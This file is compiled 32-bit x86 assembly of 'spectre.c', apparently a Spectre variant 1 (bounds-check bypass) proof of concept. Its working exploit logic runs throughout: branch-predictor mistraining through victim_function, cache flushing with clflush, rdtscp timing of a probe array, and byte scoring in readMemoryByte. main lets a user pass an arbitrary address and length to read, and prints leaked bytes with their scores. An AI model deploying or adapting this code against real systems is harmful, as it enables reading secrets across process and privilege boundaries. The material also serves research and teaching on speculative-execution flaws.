	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	4(%esp), %eax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	4(%esp), %edx
	movl	array1_size@GOTOFF(%eax), %ecx
	cmpl	%edx, %ecx
	jbe	.L3
	movzbl	array1@GOTOFF(%eax,%edx), %edx
	sall	$9, %edx
	movzbl	array2@GOTOFF(%eax,%edx), %edx
	andb	%dl, temp@GOTOFF(%eax)
.L3:
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	$256, %ecx
	pushl	%edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	pushl	%esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	call	__x86.get_pc_thunk.si
	addl	$_GLOBAL_OFFSET_TABLE_, %esi
	pushl	%ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	subl	$92, %esp
	.cfi_def_cfa_offset 112
	movl	116(%esp), %eax
	movl	%eax, 56(%esp)
	movl	120(%esp), %eax
	leal	results.0@GOTOFF(%esi), %edi
	movl	%esi, 24(%esp)
	movl	%eax, 60(%esp)
	movl	%gs:20, %eax
	movl	%eax, 76(%esp)
	xorl	%eax, %eax
	movl	%edi, 44(%esp)
	movl	$0, 68(%esp)
	movl	$999, 36(%esp)
	rep stosl
	leal	array1_size@GOTOFF(%esi), %eax
	movl	%eax, 52(%esp)
	leal	68(%esp), %eax
	movl	%eax, 32(%esp)
	leal	array2@GOTOFF(%esi), %eax
	movl	%eax, 28(%esp)
	leal	array1@GOTOFF(%esi), %eax
	movl	%eax, 40(%esp)
.L6:
	movl	28(%esp), %edi
	movl	%edi, %eax
	leal	131072(%edi), %edx
	.p2align 4,,10
	.p2align 3
.L7:
	clflush	(%eax)
	addl	$512, %eax
	cmpl	%eax, %edx
	jne	.L7
	movl	24(%esp), %eax
	movl	112(%esp), %ebx
	movl	52(%esp), %ebp
	movl	array1_size@GOTOFF(%eax), %edi
	movl	36(%esp), %eax
	cltd
	idivl	%edi
	movl	$29, %eax
	movl	$-1431655765, %edi
	xorl	%edx, %ebx
	movl	%edx, %esi
	movl	%ebx, 12(%esp)
	movl	%eax, %ebx
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	0(%ebp)
	movl	$0, 72(%esp)
	movl	72(%esp), %eax
	cmpl	$99, %eax
	jg	.L11
	.p2align 4,,10
	.p2align 3
.L8:
	movl	72(%esp), %eax
	addl	$1, %eax
	movl	%eax, 72(%esp)
	movl	72(%esp), %eax
	cmpl	$99, %eax
	jle	.L8
.L11:
	movl	%ebx, %eax
	mull	%edi
	movl	%ebx, %eax
	subl	$1, %ebx
	shrl	$2, %edx
	leal	(%edx,%edx,2), %edx
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	movl	%eax, %edx
	shrl	$16, %eax
	xorw	%dx, %dx
	orl	%edx, %eax
	andl	12(%esp), %eax
	xorl	%esi, %eax
	pushl	%eax
	.cfi_def_cfa_offset 116
	call	victim_function
	popl	%eax
	.cfi_def_cfa_offset 112
	cmpl	$-1, %ebx
	jne	.L9
	movl	%ebx, 48(%esp)
	movl	$13, %ebp
	.p2align 4,,10
	.p2align 3
.L10:
	movl	%ebp, %eax
	movzbl	%al, %ebx
	movl	%ebx, %eax
	sall	$9, %eax
	movl	%eax, 12(%esp)
	rdtscp
	movl	32(%esp), %edi
	movl	%eax, 16(%esp)
	movl	%edx, 20(%esp)
	movl	%ecx, (%edi)
	movl	28(%esp), %esi
	movl	12(%esp), %eax
	movzbl	(%esi,%eax), %eax
	rdtscp
	movl	%ecx, (%edi)
	subl	16(%esp), %eax
	movl	$50, %ecx
	movl	%eax, %esi
	sbbl	20(%esp), %edx
	xorl	%eax, %eax
	cmpl	%esi, %ecx
	sbbl	%edx, %eax
	jc	.L12
	movl	24(%esp), %eax
	movl	array1_size@GOTOFF(%eax), %ecx
	movl	36(%esp), %eax
	cltd
	idivl	%ecx
	movl	40(%esp), %eax
	movzbl	(%eax,%edx), %eax
	cmpl	%ebx, %eax
	je	.L12
	movl	44(%esp), %eax
	addl	$1, (%eax,%ebx,4)
.L12:
	addl	$167, %ebp
	cmpl	$42765, %ebp
	jne	.L10
	movl	48(%esp), %esi
	movl	44(%esp), %edi
	xorl	%eax, %eax
	xorl	%edx, %edx
	.p2align 4,,10
	.p2align 3
.L13:
	addl	$1, %eax
	movl	(%edi,%edx,4), %ecx
	cmpl	$256, %eax
	je	.L35
.L15:
	movl	24(%esp), %ebx
	movl	results.0@GOTOFF(%ebx,%eax,4), %ebx
	cmpl	%ecx, %ebx
	jge	.L19
	cmpl	$-1, %esi
	je	.L20
	cmpl	(%edi,%esi,4), %ebx
	movl	(%edi,%edx,4), %ecx
	cmovge	%eax, %esi
	addl	$1, %eax
	cmpl	$256, %eax
	jne	.L15
.L35:
	movl	44(%esp), %eax
	movl	%esi, 48(%esp)
	movl	(%eax,%esi,4), %eax
	leal	4(%eax,%eax), %ebx
	cmpl	%ecx, %ebx
	jl	.L16
	cmpl	$2, %ecx
	jne	.L21
	testl	%eax, %eax
	je	.L16
.L21:
	subl	$1, 36(%esp)
	jne	.L6
.L16:
	movl	24(%esp), %edi
	movl	44(%esp), %esi
	movl	60(%esp), %ebx
	movl	results.0@GOTOFF(%edi), %eax
	xorl	68(%esp), %eax
	movl	%eax, results.0@GOTOFF(%edi)
	movl	56(%esp), %edi
	movb	%dl, (%edi)
	movl	(%esi,%edx,4), %eax
	movl	48(%esp), %edx
	movl	%eax, (%ebx)
	movb	%dl, 1(%edi)
	movl	(%esi,%edx,4), %eax
	movl	%eax, 4(%ebx)
	movl	76(%esp), %eax
	subl	%gs:20, %eax
	jne	.L36
	addl	$92, %esp
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
	.p2align 4,,10
	.p2align 3
.L19:
	.cfi_restore_state
	movl	%edx, %esi
	movl	%eax, %edx
	jmp	.L13
	.p2align 4,,10
	.p2align 3
.L20:
	movl	%eax, %esi
	jmp	.L13
.L36:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p... "
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%edi
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	call	__x86.get_pc_thunk.di
	addl	$_GLOBAL_OFFSET_TABLE_, %edi
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	subl	$104, %esp
	movl	(%ecx), %eax
	movl	%eax, -104(%ebp)
	movl	4(%ecx), %eax
	movl	%eax, -116(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	movl	stdin@GOT(%edi), %eax
	movl	%eax, -68(%ebp)
	leal	check@GOTOFF(%edi), %eax
	movl	%eax, -112(%ebp)
	sarl	$31, %eax
	movl	%eax, -108(%ebp)
	.p2align 4,,10
	.p2align 3
.L38:
	movl	-68(%ebp), %eax
	subl	$12, %esp
	movl	%edi, %ebx
	pushl	(%eax)
	call	getc@PLT
	addl	$16, %esp
	cmpb	$114, %al
	je	.L56
	cmpb	$10, %al
	je	.L38
	cmpb	$105, %al
	jne	.L48
	call	getpid@PLT
	subl	$12, %esp
	movl	-108(%ebp), %edx
	pushl	%eax
	movl	-112(%ebp), %eax
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%edx
	pushl	%eax
	leal	.LC12@GOTOFF(%edi), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L38
.L56:
	movl	secret@GOTOFF(%edi), %eax
	leal	array1@GOTOFF(%edi), %esi
	pushl	%eax
	pushl	%eax
	leal	.LC2@GOTOFF(%edi), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	secret@GOTOFF(%edi), %eax
	movl	%eax, %edx
	movl	%eax, (%esp)
	subl	%esi, %edx
	movl	%edx, -48(%ebp)
	call	strlen@PLT
	addl	$12, %esp
	movl	%eax, -44(%ebp)
	movl	%eax, -60(%ebp)
	leal	array2@GOTOFF(%edi), %eax
	pushl	$131072
	pushl	$1
	pushl	%eax
	call	memset@PLT
	addl	$16, %esp
	cmpl	$3, -104(%ebp)
	movl	-60(%ebp), %edx
	je	.L57
.L40:
	subl	$4, %esp
	leal	.LC6@GOTOFF(%edi), %eax
	movl	%edi, %ebx
	pushl	%edx
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	addl	$16, %esp
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	testl	%eax, %eax
	js	.L38
	leal	.LC7@GOTOFF(%edi), %eax
	movl	%eax, -84(%ebp)
	leal	-40(%ebp), %eax
	movl	%eax, -72(%ebp)
	leal	-30(%ebp), %eax
	movl	%eax, -80(%ebp)
	leal	.LC8@GOTOFF(%edi), %eax
	movl	%eax, -88(%ebp)
	leal	.LC9@GOTOFF(%edi), %eax
	movl	%eax, -92(%ebp)
	leal	.LC11@GOTOFF(%edi), %eax
	movl	%eax, -76(%ebp)
	leal	.LC1@GOTOFF(%edi), %eax
	movl	%eax, -100(%ebp)
	leal	.LC0@GOTOFF(%edi), %eax
	movl	%eax, -96(%ebp)
	.p2align 4,,10
	.p2align 3
.L41:
	subl	$4, %esp
	pushl	-48(%ebp)
	movl	%edi, %ebx
	movl	$63, %esi
	pushl	-84(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movl	-48(%ebp), %eax
	addl	$12, %esp
	pushl	-72(%ebp)
	pushl	-80(%ebp)
	pushl	%eax
	leal	1(%eax), %edx
	movl	%edx, -48(%ebp)
	call	readMemoryByte
	movl	-36(%ebp), %edx
	movl	-40(%ebp), %ecx
	addl	$12, %esp
	leal	(%edx,%edx), %eax
	movl	%edx, -64(%ebp)
	cmpl	%eax, %ecx
	movl	-100(%ebp), %eax
	cmovge	-96(%ebp), %eax
	movl	%ecx, -60(%ebp)
	pushl	%eax
	pushl	-88(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movzbl	-30(%ebp), %ebx
	movl	-60(%ebp), %ecx
	movl	%ebx, %eax
	movl	%ecx, (%esp)
	subl	$32, %eax
	cmpb	$95, %al
	movl	%esi, %eax
	cmovb	%ebx, %eax
	pushl	%eax
	pushl	%ebx
	movl	%edi, %ebx
	pushl	-92(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movl	-64(%ebp), %edx
	addl	$32, %esp
	testl	%edx, %edx
	jle	.L45
	movzbl	-29(%ebp), %eax
	movl	%eax, %ecx
	subl	$32, %ecx
	cmpb	$95, %cl
	cmovb	%eax, %esi
	subl	$12, %esp
	pushl	%edx
	pushl	%esi
	pushl	%eax
	leal	.LC10@GOTOFF(%edi), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
.L45:
	subl	$8, %esp
	pushl	-76(%ebp)
	movl	%edi, %ebx
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	addl	$16, %esp
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	testl	%eax, %eax
	jns	.L41
	jmp	.L38
.L48:
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	jne	.L58
	leal	-16(%ebp), %esp
	xorl	%eax, %eax
	popl	%ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
.L57:
	.cfi_restore_state
	pushl	%eax
	leal	-48(%ebp), %eax
	pushl	%eax
	leal	.LC3@GOTOFF(%edi), %eax
	pushl	%eax
	movl	-116(%ebp), %eax
	pushl	4(%eax)
	call	__isoc99_sscanf@PLT
	addl	$12, %esp
	leal	-44(%ebp), %eax
	subl	%esi, -48(%ebp)
	pushl	%eax
	leal	.LC4@GOTOFF(%edi), %eax
	pushl	%eax
	movl	-116(%ebp), %eax
	pushl	8(%eax)
	call	__isoc99_sscanf@PLT
	leal	.LC5@GOTOFF(%edi), %eax
	pushl	-44(%ebp)
	pushl	-48(%ebp)
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %edx
	addl	$32, %esp
	jmp	.L40
.L58:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	array2
	.data
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131055
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5566:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE5566:
	.section	.text.__x86.get_pc_thunk.si,"axG",@progbits,__x86.get_pc_thunk.si,comdat
	.globl	__x86.get_pc_thunk.si
	.hidden	__x86.get_pc_thunk.si
	.type	__x86.get_pc_thunk.si, @function
__x86.get_pc_thunk.si:
.LFB5567:
	.cfi_startproc
	movl	(%esp), %esi
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.di,"axG",@progbits,__x86.get_pc_thunk.di,comdat
	.globl	__x86.get_pc_thunk.di
	.hidden	__x86.get_pc_thunk.di
	.type	__x86.get_pc_thunk.di, @function
__x86.get_pc_thunk.di:
.LFB5568:
	.cfi_startproc
	movl	(%esp), %edi
	ret
	.cfi_endproc
.LFE5568:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
